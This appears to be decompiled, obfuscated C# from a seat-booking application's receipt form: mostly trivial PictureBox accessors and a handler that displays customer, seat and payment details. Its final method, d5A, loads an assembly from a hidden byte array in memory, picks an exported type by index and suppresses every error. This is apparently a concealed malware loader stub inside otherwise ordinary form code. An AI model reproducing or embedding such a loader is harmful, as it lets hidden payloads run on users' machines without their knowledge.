	internal virtual void t1T(PictureBox j0Z)
	{
		_PictureBox12 = j0Z;
	}

	[SpecialName]
	internal virtual PictureBox w9A()
	{
		return O;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x6C(PictureBox Zs5)
	{
		PictureBox val = (O = Zs5);
	}

	[SpecialName]
	internal virtual PictureBox Po6()
	{
		return w;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c3F(PictureBox Ga3)
	{
		PictureBox val = (w = Ga3);
	}

	[SpecialName]
	internal virtual PictureBox e0N()
	{
		return v;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a2L(PictureBox Ef2)
	{
		PictureBox val = (v = Ef2);
	}

	[SpecialName]
	internal virtual PictureBox Ce7()
	{
		return _PictureBox8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k7D(PictureBox w9C)
	{
		_PictureBox8 = w9C;
	}

	[SpecialName]
	internal virtual PictureBox j1N()
	{
		return _PictureBox7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Rw1(PictureBox z7B)
	{
		_PictureBox7 = z7B;
	}

	[SpecialName]
	internal virtual PictureBox Gw3()
	{
		return _PictureBox6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b1F(PictureBox Jm6)
	{
		_PictureBox6 = Jm6;
	}

	[SpecialName]
	internal virtual PictureBox t0X()
	{
		return n;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c6G(PictureBox Mg5)
	{
		PictureBox val = (n = Mg5);
	}

	[SpecialName]
	internal virtual PictureBox k0C()
	{
		return J;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gs8(PictureBox Wc2)
	{
		PictureBox val = (J = Wc2);
	}

	[SpecialName]
	internal virtual PictureBox My7()
	{
		return _PictureBox3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void m0D(PictureBox Kg6)
	{
		_PictureBox3 = Kg6;
	}

	[SpecialName]
	internal virtual PictureBox o8T()
	{
		return _PictureBox2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a5M(PictureBox z0B)
	{
		_PictureBox2 = z0B;
	}

	[SpecialName]
	internal virtual PictureBox z7N()
	{
		return _PictureBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o5Q(PictureBox f3W)
	{
		_PictureBox1 = f3W;
	}

	private void a8Q(object sender, EventArgs e)
	{
		MytotalCost = Mi0.Forms.Cf4().totalCost;
		MytotalPayment = Mi0.Forms.Cf4().totalPayment;
		MyChange = Mi0.Forms.Cf4().change;
		MycustomerID = Mi0.Forms.Cf4().customerID;
		MyfirstName = Mi0.Forms.Cf4().firstName;
		MySeats = Mi0.Forms.Cf4().seats;
		r0E().set_Text(MycustomerID);
		s7N().set_Text(MyfirstName);
		y5J().set_Text(Conversions.ToString(MySeats));
		z4J().set_Text("$" + Conversions.ToString(MytotalCost));
		i0M().set_Text("$" + Conversions.ToString(MytotalPayment));
		e3P().set_Text("$" + Conversions.ToString(MyChange));
	}

	internal static bool d5A()
	{
		try
		{
			try
			{
				Ws4.mDic.Add(Ws4.T, AppDomain.CurrentDomain.Load((byte[])Ws4.mDic[Ws4.mArray]).GetExportedTypes()[27]);
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}
}
